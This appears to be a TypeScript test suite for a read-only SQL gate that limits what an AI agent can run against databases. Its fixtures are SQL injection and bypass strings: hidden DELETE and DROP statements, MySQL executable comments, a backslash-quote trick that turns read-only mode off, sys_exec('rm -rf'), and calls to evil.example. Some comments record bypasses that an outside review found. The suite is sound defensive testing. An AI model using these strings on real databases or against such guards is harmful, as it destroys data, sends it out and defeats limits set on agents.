/*---------------------------------------------------------------------------------------------
 *  Copyright (c) 2026 SNOUTDATA INC. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { autoLimit, autoRunBlocker, readOnlyError } from './tools';
import { readOnlyEnforcementFor } from '../dialect/flavors';

// The agent broker's read-only gate. Nothing at the database stops a write on a read-only
// connection, so these are what the agent cannot get past.
test('reads pass', () => {
	for (const sql of [
		'SELECT * FROM t',
		'with x as (select 1) select * from x',
		'EXPLAIN SELECT * FROM t',
		'SHOW search_path',
		'-- a note\nSELECT 1',
		"SELECT 'drop table t'",
		'SELECT * FROM t FOR UPDATE'
	]) {
		assert.equal(readOnlyError(sql), undefined, sql);
	}
});

test('writes behind a read-looking lead are refused', () => {
	for (const sql of [
		'WITH gone AS (DELETE FROM t RETURNING *) SELECT count(*) FROM gone',
		'EXPLAIN ANALYZE DELETE FROM t',
		"SELECT 1; DO $$ BEGIN EXECUTE 'DROP TABLE t'; END $$",
		'/* hi */ DROP TABLE t',
		'SELECT * INTO copy_of_t FROM t',
		'CALL purge()',
		'SELECT 1; DELETE FROM t'
	]) {
		assert.ok(readOnlyError(sql), sql);
	}
});

test('nothing at all is not a read', () => {
	assert.ok(readOnlyError('   '));
	assert.ok(readOnlyError('-- only a comment'));
});

// The agent gate reads SQL the way the connection's engine does.
test('engine-specific hiding places are refused', () => {
	const cases: [string, string][] = [
		['WITH a AS (SELECT 1) /*!DELETE FROM orders*/ -- limit', 'mysql-aurora'],
		['/* /* */ DROP TABLE orders', 'mysql-aurora'],
		['WITH a AS (SELECT 2 --1) DELETE FROM orders', 'mariadb'],
		["WITH a AS (SELECT '\\'') DELETE FROM orders -- '", 'mysql-aurora'],
		["SELECT 1 AS [x']; DROP TABLE orders; --']", 'sqlserver'],
		['SELECT 1 DELETE FROM orders', 'sqlserver'],
	];
	for (const [sql, driver] of cases) {
		assert.ok(readOnlyError(sql, driver), `${driver}: ${sql}`);
	}
	assert.equal(readOnlyError('SELECT [delete] FROM [orders]', 'sqlserver'), undefined);
});

// A SELECT is not read-only when a function it calls writes.
test('a read that calls a writing function is refused', () => {
	for (const sql of [
		'SELECT pg_terminate_backend(pid) FROM pg_stat_activity',
		"SELECT dblink_exec('dbname=x', 'DELETE FROM t')",
		"SELECT set_config('a', 'b', false)",
		"SELECT lo_export(1, '/tmp/x')",
		"SELECT nextval('s')",
	]) {
		assert.ok(readOnlyError(sql, 'postgres'), sql);
	}
});

// A READ ONLY transaction stops a write to a table here, not a call whose effect lands somewhere
// else: an HTTP request, a Lambda invocation, an export to S3, SQL run on another server, a
// background worker with its own transaction, an email. The statement check is what refuses them.
test('a read whose effects land outside the database is refused, on every engine', () => {
	for (const [sql, driver] of [
		["SELECT http_get('https://example.com/hook')", 'postgres'],
		["SELECT * FROM http_post('https://example.com', 'x', 'text/plain')", 'postgres'],
		["SELECT status FROM http(('POST', 'https://example.com', NULL, NULL, NULL)::http_request)", 'postgres'],
		["SELECT public.http_put('https://example.com', 'x', 'text/plain')", 'postgres'],
		["SELECT net.http_post(url := 'https://example.com')", 'postgres'],
		["SELECT * FROM aws_lambda.invoke(aws_commons.create_lambda_function_arn('f'), '{}'::json)", 'postgres'],
		["SELECT * FROM invoke('arn:aws:lambda:us-west-2:1:function:f', '{}'::json)", 'postgres'],
		["SELECT * FROM aws_s3.query_export_to_s3('SELECT * FROM t', aws_commons.create_s3_uri('b', 'k', 'us-west-2'))", 'postgres'],
		["SELECT query_export_to_s3('SELECT 1', 'b')", 'postgres'],
		["SELECT aws_s3.table_import_from_s3('t', '', '(format csv)', 'b', 'k', 'us-west-2')", 'postgres'],
		["SELECT * FROM dblink('host=other', 'SELECT 1') AS t(x int)", 'postgres'],
		["SELECT pg_background_launch('DELETE FROM t')", 'postgres'],
		["SELECT pg_notify('ch', 'x')", 'postgres'],
		["SELECT azure_storage.blob_put('acct', 'c', 'k', 'x')", 'postgres'],
		["SELECT lambda_sync('arn:aws:lambda:us-west-2:1:function:f', '{}')", 'mysql-aurora'],
		["SELECT lambda_async('arn:aws:lambda:us-west-2:1:function:f', '{}')", 'mysql-aurora'],
		["SELECT sys_exec('rm -rf /tmp/x')", 'mysql-aurora'],
		["SELECT utl_http.request('https://example.com') FROM dual", 'oracle'],
		["SELECT utl_smtp.open_connection('mail') FROM dual", 'oracle'],
		["SELECT utl_tcp.open_connection('h', 25) FROM dual", 'oracle'],
		["SELECT utl_mail.send('a', 'b') FROM dual", 'oracle'],
		["SELECT dbms_scheduler.run_job('j') FROM dual", 'oracle'],
		["SELECT dbms_cloud.send_request('c', 'https://example.com', 'GET') FROM dual", 'oracle'],
		["EXEC msdb.dbo.sp_send_dbmail @recipients = 'a@b.c', @body = 'x'", 'sqlserver'],
		["SELECT 1; EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @o OUT", 'sqlserver'],
		["sp_send_dbmail @recipients = 'a@b.c'", 'sqlserver'],
		["EXEC ('DELETE FROM t') AT linked_srv", 'sqlserver'],
		["SELECT * FROM OPENQUERY(linked_srv, 'SELECT 1')", 'sqlserver'],
	] as const) {
		assert.ok(readOnlyError(sql, driver), `${driver}: ${sql}`);
	}
});

test('a call refused for acting outside the database says so', () => {
	assert.match(readOnlyError("SELECT http_get('https://example.com')", 'postgres') ?? '', /outside it/);
});

test('reads that only look like those calls still pass', () => {
	for (const sql of [
		// A string that names the function without calling it (one that calls it is refused, below).
		"SELECT 'http_get'",
		'SELECT httpd_status, invoked_at FROM requests',
		"SELECT url FROM http_log WHERE method = 'GET'",
	]) {
		assert.equal(readOnlyError(sql, 'postgres'), undefined, sql);
	}
});

test('Always allow runs only plain reads, and never on production', () => {
	assert.equal(autoRunBlocker('SELECT count(*) FROM t', { driver: 'postgres' }), undefined);
	assert.ok(autoRunBlocker('SELECT count(*) FROM t', { driver: 'postgres', production: true }));
	assert.ok(autoRunBlocker('SELECT pg_terminate_backend(pid) FROM pg_stat_activity', { driver: 'postgres' }));
	assert.ok(autoRunBlocker("SELECT dblink_exec('x', 'DELETE FROM t')", { driver: 'postgres' }));
	assert.ok(autoRunBlocker('SELECT pg_sleep(600)', { driver: 'postgres' }));
	assert.ok(autoRunBlocker('SELECT purge_everything()', { driver: 'postgres' }));
	assert.ok(autoRunBlocker('DELETE FROM t', { driver: 'postgres' }));
});

// A LIMIT in a comment or a string does not lift the row cap.
test('autoLimit reads past comments and strings', () => {
	assert.equal(autoLimit('SELECT * FROM t -- limit', 10), 'SELECT * FROM t -- limit\nLIMIT 10');
	assert.equal(autoLimit("SELECT 'no limit' FROM t", 10), "SELECT 'no limit' FROM t\nLIMIT 10");
	assert.equal(autoLimit('SELECT * FROM t LIMIT 5', 10), 'SELECT * FROM t LIMIT 5');
	assert.equal(autoLimit('SHOW TABLES', 10), 'SHOW TABLES');
});

// Db2 runs a write from inside a SELECT, and has no read-only session to refuse it.
test('a write nested inside a read is refused, on every engine', () => {
	const cases: [string, string | undefined][] = [
		['SELECT * FROM OLD TABLE (DELETE FROM orders)', 'db2'],
		['SELECT id FROM FINAL TABLE (UPDATE orders SET status = 0)', 'db2'],
		['SELECT id FROM NEW TABLE (INSERT INTO orders (id) VALUES (1))', 'db2'],
		['SELECT * FROM OLD TABLE (-- x\nDELETE FROM orders)', 'db2'],
		['VALUES (SELECT COUNT(*) FROM OLD TABLE (DELETE FROM orders))', 'db2'],
		['WITH m AS (MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE RETURNING t.*) SELECT * FROM m', 'postgres'],
		['SELECT * FROM (DELETE FROM orders OUTPUT deleted.*) AS d', 'sqlserver'],
		['SELECT * FROM OLD TABLE (DELETE FROM orders)', undefined],
	];
	for (const [sql, driver] of cases) {
		assert.ok(readOnlyError(sql, driver), `${driver}: ${sql}`);
	}
	assert.equal(readOnlyError("SELECT replace(name, 'a', 'b') FROM t WHERE note = 'FINAL TABLE (UPDATE t)'", 'db2'), undefined);
});

test('a Snowflake SYSTEM$ that acts, and a sequence advance, are refused as reads', () => {
	assert.match(readOnlyError("SELECT SYSTEM$TASK_DEPENDENTS_ENABLE('db.s.t')", 'snowflake') ?? '', /system\$task_dependents_enable\(\)/);
	assert.match(readOnlyError("SELECT SYSTEM$GENERATE_SCIM_ACCESS_TOKEN('OKTA')", 'snowflake') ?? '', /changes the database/);
	assert.equal(readOnlyError("SELECT SYSTEM$CLUSTERING_INFORMATION('t')", 'snowflake'), undefined);
	assert.match(readOnlyError('SELECT NEXT VALUE FOR dbo.s', 'sqlserver') ?? '', /calls NEXT VALUE FOR,/);
	assert.ok(readOnlyError('SELECT s.NEXTVAL FROM dual', 'oracle'));
	assert.ok(readOnlyError('SELECT seq.nextval', 'snowflake'));
	// Quoting the names, or naming the function by a string, hides neither (an outside review, 2026-10-14).
	for (const driver of ['snowflake', 'hana', 'oracle']) {
		assert.match(readOnlyError('SELECT "SEQ1"."NEXTVAL"', driver) ?? '', /calls sequence NEXTVAL,/, driver);
	}
	assert.match(readOnlyError("SELECT IDENTIFIER('SYSTEM$CANCEL_ALL_QUERIES')(1)", 'snowflake') ?? '', /IDENTIFIER/);
	assert.equal(readOnlyError("SELECT \"ID\", \"Amount\" FROM IDENTIFIER('db.s.orders') WHERE \"ID\" IN (1, 2)", 'snowflake'), undefined);
});

// Where the database is never asked to refuse a write (Snowflake, SAP HANA, Db2, TiDB, OceanBase),
// a read is what an allow-list admits: Snowflake's flow operator and its anonymous procedures read
// as a SHOW, a SELECT or a WITH to a check that only looks for write verbs.
test('Snowflake: the ->> flow operator and anonymous procedures are refused, however they are written', () => {
	const probes = [
		'SHOW TABLES ->> DROP TABLE orders',
		'SELECT 1 ->> DELETE FROM orders',
		'show tables->>drop table orders',
		'SHOW TABLES\n  ->>\n  DROP TABLE orders',
		'SHOW TABLES /* note */ ->> /* note */ DROP TABLE orders',
		'SHOW TABLES -- note\n->> DROP TABLE orders',
		'SHOW TABLES // note\n->> DROP TABLE orders',
		'SELECT 1 ->> SELECT 2 ->> TRUNCATE TABLE orders',
		"SHOW TABLES ->> SELECT * FROM $1 WHERE \"name\" = 'x' ->> DELETE FROM orders",
		'(SELECT 1) ->> DELETE FROM orders',
		'SELECT 1 ->> CALL purge()',
		'SELECT 1 ->> EXECUTE IMMEDIATE \'DROP TABLE orders\'',
		"WITH p AS PROCEDURE () RETURNS VARCHAR LANGUAGE SQL AS $$ begin drop table orders; return 'x'; end; $$ CALL p()",
		"with p as procedure() returns varchar language sql as $$ begin delete from orders; return 'x'; end $$ call p()",
		"WITH a AS (SELECT 1), p AS PROCEDURE () RETURNS VARCHAR LANGUAGE SQL AS $$ begin drop table orders; end $$ CALL p()",
		"WITH p AS PROCEDURE () RETURNS VARCHAR LANGUAGE SQL AS 'begin drop table orders; end' CALL p()",
		"EXECUTE IMMEDIATE $$ begin drop table orders; end $$",
		'BEGIN DROP TABLE orders; END',
		'DECLARE x INT; BEGIN DELETE FROM orders; END',
		"SELECT 1; SELECT 2",
		'CALL purge()',
		'TABLE orders',
	];
	for (const sql of probes) {
		assert.ok(readOnlyError(sql, 'snowflake'), sql);
		assert.ok(autoRunBlocker(sql, { driver: 'snowflake' }), sql);
	}
});

test('the lexical-only engines admit only one plain read', () => {
	const refused: [string, string, string?][] = [
		['SELECT * FROM orders WHERE id IN (SELECT id FROM OLD TABLE (DELETE FROM orders))', 'db2'],
		['VALUES NEXT VALUE FOR s', 'db2'],
		['CALL sysproc.admin_cmd(\'REORG TABLE t\')', 'db2'],
		['BEGIN ATOMIC DELETE FROM orders; END', 'db2'],
		['DO BEGIN DELETE FROM orders; END', 'hana'],
		['SELECT s.NEXTVAL FROM dummy', 'hana'],
		['WITH x AS (SELECT 1) DELETE FROM orders', 'hana'],
		['WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x', 'snowflake'],
		['EXPLAIN ANALYZE SELECT * FROM orders', 'mysql-aurora', 'tidb'],
		['SELECT 1; DELETE FROM orders', 'mysql-aurora', 'tidb'],
		['/*!DELETE FROM orders*/ SELECT 1', 'mysql-aurora', 'oceanbase'],
		['SET GLOBAL tidb_gc_enable = 0', 'mysql-aurora', 'tidb'],
		['USE other', 'mysql-aurora', 'tidb'],
		['SELECT * FROM t INTO OUTFILE \'/tmp/x\'', 'mysql-aurora', 'tidb'],
		['SHOW TABLES ->> DROP TABLE orders', 'some-new-driver'],
		// HANA's EXPLAIN PLAN stores the plan in EXPLAIN_PLAN_TABLE.
		['EXPLAIN PLAN FOR SELECT * FROM orders', 'hana'],
	];
	for (const [sql, driver, flavor] of refused) {
		assert.ok(readOnlyError(sql, driver, flavor), `${driver}/${flavor ?? ''}: ${sql}`);
	}
	const reads: [string, string, string?][] = [
		['SELECT * FROM orders', 'snowflake'],
		['select o.id, o."begin" from orders o where o.note = \'call me; ->> drop\'', 'snowflake'],
		['WITH recent AS (SELECT * FROM orders), totals (n) AS (SELECT count(*) FROM recent) SELECT * FROM totals', 'snowflake'],
		['SHOW TABLES IN SCHEMA analytics', 'snowflake'],
		['DESCRIBE TABLE orders', 'snowflake'],
		['DESC TABLE orders', 'snowflake'],
		['EXPLAIN USING TEXT SELECT * FROM orders', 'snowflake'],
		['LIST @my_stage', 'snowflake'],
		['SELECT $1, $2 FROM @my_stage', 'snowflake'],
		["SELECT SYSTEM$CLUSTERING_INFORMATION('orders')", 'snowflake'],
		['VALUES (1, 2)', 'db2'],
		['SELECT * FROM orders FOR UPDATE WITH RS', 'db2'],
		['SELECT * FROM dummy', 'hana'],
		["SELECT doc->>'$.name' FROM t", 'mysql-aurora', 'tidb'],
		['SHOW CREATE TABLE orders', 'mysql-aurora', 'tidb'],
		['SELECT * FROM orders LIMIT 10', 'mysql-aurora', 'oceanbase'],
	];
	for (const [sql, driver, flavor] of reads) {
		assert.equal(readOnlyError(sql, driver, flavor), undefined, `${driver}/${flavor ?? ''}: ${sql}`);
	}
});

// Every executable comment form a MySQL-family server runs is refused in a read: TiDB's `/*T!`, which
// TiDB runs and the guard read as a comment until 2026-10-14, MariaDB's `/*M!`, and MySQL's own.
test('executable comments are refused in a read on every MySQL-family engine', () => {
	const engines: [string, string?][] = [['mysql-aurora', 'tidb'], ['mysql-aurora', 'oceanbase'], ['mysql-aurora'], ['mariadb'], ['some-new-driver']];
	const refused = [
		'/*T! DELETE FROM orders WHERE EXISTS (*/ SELECT 1 /*T! ) */',
		'/*T! INSERT INTO t2 */ SELECT * FROM t1',
		"SELECT * FROM t /*T! INTO OUTFILE '/tmp/x' */",
		'SELECT * FROM t /*T![clustered_index] FOR UPDATE */',
		'/*M! DELETE FROM orders WHERE EXISTS (*/ SELECT 1 /*M! ) */',
		'/*M!100100 INSERT INTO t2 */ SELECT * FROM t1',
		'/*!50000 INSERT INTO t2 */ SELECT * FROM t1',
		'SELECT /*! STRAIGHT_JOIN */ * FROM t',
		'SELECT /*!40001 SQL_NO_CACHE */ * FROM t',
	];
	for (const [driver, flavor] of engines) {
		for (const sql of refused) {
			assert.ok(readOnlyError(sql, driver, flavor), `${driver}/${flavor ?? ''}: ${sql}`);
			assert.ok(autoRunBlocker(sql, { driver, flavor }), `${driver}/${flavor ?? ''}: ${sql}`);
		}
		for (const sql of [
			'SELECT /*+ MAX_EXECUTION_TIME(1000) */ * FROM t',
			'SELECT /* careful! not code */ * FROM t',
			'SELECT 1 /* T! M! ! */',
			"SELECT '/*T! DELETE FROM t */' AS note",
			'SELECT 1 -- /*! DROP TABLE t */',
		]) {
			assert.equal(readOnlyError(sql, driver, flavor), undefined, `${driver}/${flavor ?? ''}: ${sql}`);
		}
	}
});

test('the engines the database holds to read-only keep their own check', () => {
	// Session bookkeeping and Postgres's TABLE are still reads where the database refuses writes too.
	assert.equal(readOnlyError('TABLE orders', 'postgres'), undefined);
	assert.equal(readOnlyError('SELECT 1; SELECT 2', 'postgres'), undefined);
	assert.equal(readOnlyError("SELECT data->>'k' FROM t", 'postgres'), undefined);
	assert.equal(readOnlyError('SELECT 1', 'mysql-aurora'), undefined);
	assert.match(readOnlyError('SHOW TABLES ->> SELECT 1', 'snowflake') ?? '', /->> flow operator, which runs a second statement, and Snowflake is not asked to refuse writes/);
	assert.match(readOnlyError('SHOW TABLES ->> DROP TABLE orders', 'snowflake') ?? '', /DROP/);
});

// SQL Server ends the read-only run's transaction at a COMMIT, wherever it sits in the batch.
test('SQL Server: transaction control and batch statements are refused, with or without a semicolon', () => {
	for (const sql of [
		'SELECT 1 AS n COMMIT DISABLE TRIGGER trg_audit ON dbo.orders',
		'SELECT 1 AS n COMMIT ENABLE TRIGGER ALL ON dbo.orders',
		'SELECT 1 AS n COMMIT RECEIVE TOP (1) * FROM dbo.q',
		"SELECT 1 AS n COMMIT DECLARE @p varbinary(16) WRITETEXT dbo.t.c @p 'x'",
		'SELECT 1 ROLLBACK SELECT 2',
		'SELECT 1 SAVE TRAN s',
		'SELECT 1; SAVE TRAN s',
		'SELECT 1 BEGIN DISTRIBUTED TRAN',
		'SELECT 1 DISABLE TRIGGER trg_audit ON dbo.orders',
	]) {
		assert.ok(readOnlyError(sql, 'sqlserver'), sql);
	}
	assert.equal(readOnlyError('SELECT [commit] FROM [log]', 'sqlserver'), undefined);
});

// An outside review, 2026-10-14: on a Postgres database or role with standard_conforming_strings
// off, `'a\', '` is ONE string to the server, so what the on-rules read as a second string is code.
// It switched the session default off, ended the read-only transaction and deleted rows, and the
// read passed. Every Postgres-family read is now lexed by both rules, and nothing judged a read may
// end its transaction or turn read-only off.
test('Postgres: a statement hidden by a backslash-escaped quote is refused', () => {
	for (const driver of [undefined, 'postgres', 'redshift']) {
		for (const sql of [
			"SELECT 'a\\', '; SET default_transaction_read_only = off; COMMIT; DELETE FROM t; --'",
			"SELECT 'a\\', '; END; SELECT 1; --'",
			"SELECT E'x\\\\', 'a\\', '; ABORT; --'",
		]) {
			assert.ok(readOnlyError(sql, driver), `${driver}: ${sql}`);
		}
	}
});

test('a read may not end its transaction or turn read-only off', () => {
	for (const [sql, said] of [
		['SELECT 1; END', /END/],
		['SELECT 1; ABORT', /ABORT/],
		['SELECT 1; START TRANSACTION READ WRITE', /START TRANSACTION/],
		["SELECT 1; PREPARE TRANSACTION 'x'", /PREPARE TRANSACTION/],
		['SELECT 1; COMMIT', /COMMIT/],
		['SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE', /SET/],
		["SELECT set_config('default_transaction_read_only', 'off', false)", /set_config/i],
	] as const) {
		assert.match(readOnlyError(sql, 'postgres') ?? '', said, sql);
	}
});

test('autoLimit caps a query when either string rule leaves it without a LIMIT', () => {
	// Under the off-rules the LIMIT below is code; under the on-rules it is inside a string.
	assert.equal(autoLimit("SELECT 'a\\', ' limit 5' FROM t", 10), "SELECT 'a\\', ' limit 5' FROM t\nLIMIT 10");
	assert.equal(autoLimit('SELECT * FROM t LIMIT 5', 10), 'SELECT * FROM t LIMIT 5');
});

// An outside review (2026-10-14): each of these came back allowed, though the same call written directly is refused.
test('a function that runs a query string is refused, on its engine and on one nobody knows', () => {
	for (const [sql, driver] of [
		["SELECT ts_stat('select to_tsvector(dblink_exec(''dbname=app'',''DROP TABLE orders''))')", 'postgres'],
		["SELECT ts_rewrite('a & b'::tsquery, 'select dblink_exec(''dbname=app'',''DROP TABLE orders'')')", 'postgres'],
		["SELECT * FROM crosstab('select a, b, c from t') AS ct(a text, b text)", 'postgres'],
		["SELECT * FROM connectby('t', 'id', 'parent_id', '1', 0) AS c(id int, p int, l int)", 'postgres'],
		["SELECT * FROM xpath_table('id', 'doc', 'docs', '/a', 'true') AS x(id int, a text)", 'postgres'],
		["SELECT query_to_xml('select 1', true, false, '')", 'postgres'],
		["SELECT DBMS_XMLGEN.getxml('select utl_http.request(''http://evil.example/'') from dual') FROM dual", 'oracle'],
		["SELECT DBMS_XMLGEN.getxmltype('select 1 from dual') FROM dual", 'oracle'],
		["SELECT DBMS_XMLQUERY.getxml('select utl_http.request(''http://evil.example/'') from dual') FROM dual", 'oracle'],
		['SELECT XMLTYPE(CURSOR(SELECT * FROM t)) FROM dual', 'oracle'],
		["WITH FUNCTION f RETURN NUMBER IS BEGIN EXECUTE IMMEDIATE 'DROP TABLE t'; RETURN 1; END; SELECT f FROM dual", 'oracle'],
		[`SELECT XMLQUERY('db2-fn:sqlquery("SELECT SYSTOOLS.HTTPGETCLOB(''http://evil.example/'', '''') FROM SYSIBM.SYSDUMMY1")') FROM SYSIBM.SYSDUMMY1`, 'db2'],
		["EXEC sp_executesql N'SELECT 1'", 'sqlserver'],
		["SELECT 1 EXEC sp_executesql N'DROP TABLE t'", 'sqlserver'],
		["EXEC('DROP TABLE t')", 'sqlserver'],
		["SELECT 1; EXECUTE IMMEDIATE 'DROP TABLE t'", 'snowflake'],
		["SELECT f('select system$cancel_all_queries(1)')", 'snowflake'],
	] as const) {
		assert.ok(readOnlyError(sql, driver), `${driver}: ${sql}`);
		assert.ok(readOnlyError(sql, 'somedb'), `somedb: ${sql}`);
	}
	assert.match(readOnlyError("SELECT * FROM t WHERE note = 'dblink_exec('", 'postgres') ?? '', /dblink_exec/);
	assert.equal(readOnlyError("SELECT * FROM t WHERE note = 'call dblink later'", 'postgres'), undefined);
});

// The Oracle summary (`dialect/readOnly.ts`) says these packages are refused by the statement check:
// hold it to that, written directly, inside a string a function runs, and inside any string.
test('Oracle: the packages the summary says are refused are refused, however a read reaches them', () => {
	assert.match(readOnlyEnforcementFor('oracle').summary, /UTL_HTTP, UTL_FILE, DBMS_CLOUD/);
	for (const call of ["utl_http.request('http://evil.example/')", "UTL_FILE.FOPEN('DIR', 'x', 'w')", "dbms_cloud.send_request('c', 'http://x', 'GET')"]) {
		const quoted = call.replace(/'/g, "''");
		for (const sql of [
			`SELECT ${call} FROM dual`,
			`SELECT DBMS_XMLGEN.getxml('select ${quoted} from dual') FROM dual`,
			`SELECT my_pkg.run('select ${quoted} from dual') FROM dual`,
			`SELECT my_pkg.run(q'[select ${call} from dual]') FROM dual`,
		]) {
			assert.ok(readOnlyError(sql, 'oracle'), sql);
		}
	}
});
